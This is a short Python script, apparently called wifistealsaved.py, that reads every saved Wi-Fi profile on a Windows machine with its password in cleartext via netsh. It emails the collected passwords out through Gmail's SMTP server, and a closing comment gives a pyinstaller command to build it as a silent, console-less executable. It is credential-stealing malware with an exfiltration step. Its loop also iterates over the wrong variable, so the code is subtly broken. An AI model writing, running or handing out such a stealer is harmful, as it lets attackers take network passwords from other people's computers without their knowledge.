# install smtplib before running this script

import subprocess, smtplib, re

"""
"netsh wlan show profile" displays all the saved wifi network on any 
wireless access point. 'netsh' command is only for windows
"""
getlist_command = "netsh wlan show profile"

networks = subprocess.check_output(getlist_command, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

final_output = ""

for network in networks:
    command = "netsh wlan show profile " + network + " key=clear"
    wifi_detail = subprocess.check_output(command, shell=True)
    final_output += wifi_detail + "|"

server = smtplib.SMTP("smtp.gmail.com",587)
server.starttls()

email_id = "temp@gmail.com"
passwrd = "temo"
server.login(email_id, passwrd)
server.sendmail(email_id,email_id, final_output)
server.quit()


"""
run this command to generate the exe file
pyinstaller.exe --onefile --noconsole wifistealsaved.py
"""